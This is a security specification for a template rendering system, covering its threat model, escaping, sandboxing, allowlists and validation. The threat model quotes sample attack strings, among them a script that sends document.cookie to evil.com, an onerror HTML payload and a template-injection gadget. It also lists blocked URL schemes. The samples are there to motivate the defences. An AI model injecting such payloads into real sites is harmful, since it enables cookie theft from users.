# Dynamic Template Field System — Security & Validation

> **Status:** Specification · **Version:** 1.0

## Overview

Security is the highest-priority concern in a system that renders
user-authored templates against live data. This document defines the
threat model, security controls, and validation strategy.

## Threat model

```text
┌──────────────────────────────────────────────────────────────────┐
│                    THREAT MODEL                                  │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  T1 — XSS via template variable                                  │
│    Attacker stores: <script>fetch('//evil.com?c='+              │
│      document.cookie)</script> in customer.name                  │
│    Template: {{ customer.name }}                                │
│    Without escaping → script executes in recipient browser     │
│                                                                  │
│  T2 — HTML injection                                             │
│    Attacker stores: <img src=x onerror=alert(1)> in a field      │
│    Template renders it as inline HTML                            │
│    → Event handler fires on render                               │
│                                                                  │
│  T3 — Template injection (SSTI)                                  │
│    Attacker stores: {{ ''.__class__.__mro__[1].__subprocess__ }} │
│    If template engine evaluates raw expressions → RCE           │
│                                                                  │
│  T4 — Data exfiltration                                           │
│    Template author references {{ request.user.password }}       │
│    → Sensitive data leaks into rendered output                   │
│                                                                  │
│  T5 — Denial of service                                           │
│    Template with {{ order.items|join:"..." }} where items      │
│    is a 10M-row queryset → memory exhaustion                    │
│                                                                  │
│  T6 — Phishing via URL injection                                  │
│    Attacker stores: https://evil.com in a link field             │
│    Template renders clickable link → phishing                   │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

## Security controls

### Control 1 — Auto-escape (defeats T1, T2)

Every resolved value is HTML-escaped before insertion into output:

```text
Raw value:        <script>alert('xss')</script>
After escape:     &lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;

Raw value:        <img src=x onerror=alert(1)>
After escape:     &lt;img src=x onerror=alert(1)&gt;
```

Escaping rules (applied in order):

| Char | Escape |
|---|---|
| `&` | `&amp;` |
| `<` | `&lt;` |
| `>` | `&gt;` |
| `"` | `&quot;` |
| `'` | `&#x27;` |
| `/` | `&#x2F;` (prevents `</script>` closure) |

**No raw HTML passthrough.** The only exception is the `|linebreaks`
filter, which converts newlines to `<p>` and `<br>` tags on the
pre-escape raw value, then re-escapes everything except those
whitelisted tags.

### Control 2 — Sandboxed evaluation (defeats T3)

The template field system does NOT use Django's `Template()` engine or
Jinja2's `eval` to evaluate `{{ }}` tokens. Instead:

1. Tokens are **regex-parsed** into `FieldReference` objects.
2. Resolution uses **dotted-path traversal** (dict `__getitem__` /
   object `getattr`), never `eval()` or `exec()`.
3. No Python expression evaluation — `{{ 1+1 }}` is treated as a
   field path `"1+1"` (which resolves to empty, not `2`).

```text
┌──────────────────────────────────────────────────────────────┐
│  SAFE: Regex parse + dict traversal                           │
│                                                               │
│  Token: {{ order.total|currency:USD }}                       │
│    → regex match → path="order.total", filters=[currency]    │
│    → context["order"]["total"] → Decimal("99.50")            │
│    → FilterRegistry.apply("currency", ...)                   │
│    → "$99.50"                                                 │
│                                                               │
│  BLOCKED: No eval, no exec, no __import__                     │
│                                                               │
│  Token: {{ ''.__class__.__mro__[1] }}                         │
│    → regex match → path="''.__class__.__mro__[1]"            │
│    → segments = ["''__class__'__mro__'[1]"]  (treated as     │
│      literal field name, not evaluated)                       │
│    → context["''.__class__'__mro__'[1]"] → KeyError           │
│    → empty string                                             │
└──────────────────────────────────────────────────────────────┘
```

### Control 3 — Allowlist data sources (defeats T4)

Each template declares an allowed root-object list in its schema:

```json
{
  "allowed_sources": ["customer", "order", "company", "invoice"]
}
```

The resolver refuses to resolve any root object not in the allowlist.
This prevents `{{ request.user.password }}` or
`{{ settings.SECRET_KEY }}` from resolving.

```text
Template: {{ request.user.password }}
Schema allowed_sources: ["customer", "order", "company"]

Resolver:
  root = "request"
  "request" in allowed_sources? → NO
  → ResolvedValue(raw="", resolved=False, source="blocked")
  → Security warning logged
```

### Control 4 — Queryset length limits (defeats T5)

List-type fields are bounded:

| Setting | Default | Purpose |
|---|---|---|
| `TEMPLATE_FIELD_MAX_LIST_LENGTH` | 1000 | Max items in a list field |
| `TEMPLATE_FIELD_MAX_STRING_LENGTH` | 10000 | Max chars in a single value |
| `TEMPLATE_FIELD_MAX_RENDER_TIME_MS` | 5000 | Render timeout |
| `TEMPLATE_FIELD_MAX_TOKENS` | 500 | Max `{{ }}` tokens per template |

If a list field exceeds the limit, it is truncated and a warning is
added to the validation issues.

### Control 5 — URL sanitization (defeats T6)

The `|url_encode` filter percent-encodes URLs. The renderer also
validates any value used in an `href` context:

```text
Blocked URL schemes:
  javascript:    → stripped entirely
  data:          → stripped (except data:image/*)
  vbscript:      → stripped
  file:          → stripped

Allowed URL schemes:
  https://       → allowed
  http://        → allowed
  mailto:        → allowed
  tel:           → allowed
  # (fragment)   → allowed
  / (relative)   → allowed
```

## Validation strategy

### Validation levels

```text
┌──────────────────────────────────────────────────────────────┐
│  IssueLevel                                                   │
├──────────────────────────────────────────────────────────────┤
│  INFO    → Undeclared variable, type info.                   │
│           No action needed, editor informed.                  │
│                                                               │
│  WARNING → Required field missing, type mismatch,             │
│           fallback used, list truncated.                       │
│           Editor should fix before publishing.                 │
│           Template still renders.                              │
│                                                               │
│  ERROR   → Blocked data source, parse error,                  │
│           render timeout, token limit exceeded.               │
│           Template should not be published.                   │
│           Still renders (fail-safe) but with gaps.           │
└──────────────────────────────────────────────────────────────┘
```

### Validation checks

| Check | Level | Condition | Example |
|---|---|---|---|
| Required missing | WARNING | `required=True` but `source != "context"` | `customer.name` fell back to "Guest" |
| Type mismatch | WARNING | `type=NUMBER` but value is `str` | `order.total` is "ninety-nine" |
| Undeclared variable | INFO | Not in `field_schema` | Template uses `{{ order.notes }}` but schema has no `notes` |
| Blocked source | ERROR | Root not in `allowed_sources` | `{{ request.user.password }}` |
| List truncated | WARNING | List length > `MAX_LIST_LENGTH` | `order.items` had 5000, truncated to 1000 |
| String truncated | WARNING | String > `MAX_STRING_LENGTH` | `order.notes` was 50KB, truncated |
| Parse error | ERROR | Malformed token syntax | `{{ order.total|` (unclosed) |
| Token limit | ERROR | More than `MAX_TOKENS` | Template has 600 tokens (limit 500) |
| Unknown filter | ERROR | Filter not in registry | `{{ x|nonexistent }}` |

### Validation flow

```text
         ┌────────────────────┐
         │ ResolvedValues     │
         │ + TemplateSchema   │
         └────────┬───────────┘
                  │
          ┌───────┼───────┐
          │       │       │
          ▼       ▼       ▼
     ┌────────┐┌────────┐┌──────────┐
     │Required││ Type   ││ Allowlist│
     │ check  ││ check  ││ check    │
     └───┬────┘└───┬────┘└────┬─────┘
         │          │          │
         ▼          ▼          ▼
     WARNING    WARNING     ERROR
         │          │          │
         └──────┬───┴──────────┘
                │
                ▼
     ┌──────────────────────┐
     │ list[ValidationIssue] │
     └──────────────────────┘
```

## Permission model

```text
┌──────────────────────────────────────────────────────────────┐
│  Permission checks (run before resolution)                   │
├──────────────────────────────────────────────────────────────┤
│                                                              │
│  1. Template access                                          │
│     Can user X render template Y?                             │
│     → EmailTemplate.is_active && user.has_perm("view")       │
│                                                              │
│  2. Data source access                                       │
│     Can user X access data from "customer" object?            │
│     → Product-level permission check                         │
│     → POS: user.is_staff or order belongs to user's branch   │
│     → CRM: user has "contacts.view" permission               │
│                                                              │
│  3. Preview permission                                       │
│     Can user X preview this template?                         │
│     → user.has_perm("emailtemplate.preview")                 │
│                                                              │
│  4. Publish permission                                       │
│     Can user X publish this template?                        │
│     → user.has_perm("emailtemplate.change")                  │
│     → is_system templates cannot be modified                 │
│                                                              │
└──────────────────────────────────────────────────────────────┘
```

## Audit logging

Every render operation is logged with:

```text
┌──────────────────────────────────────────────────────────────┐
│  RenderAuditLog (extends EmailLog or standalone)              │
├──────────────────────────────────────────────────────────────┤
│  template_name: str        # "invoice_template"              │
│  template_version: int     # version used                     │
│  rendered_by: User         # who triggered the render         │
│  rendered_at: datetime     # when                            │
│  context_summary: dict     # keys only, not values (privacy) │
│  resolved_count: int       # vars resolved from context      │
│  unresolved_count: int     # vars that fell back             │
│  issues: list[dict]        # validation issues as JSON       │
│  render_time_ms: int       # execution time                  │
│  output_format: str        # "email", "pdf", "html"          │
│  is_preview: bool          # was this a preview render?       │
└──────────────────────────────────────────────────────────────┘
```

Context values are NEVER logged — only the **keys** (field paths) are
recorded to protect PII.
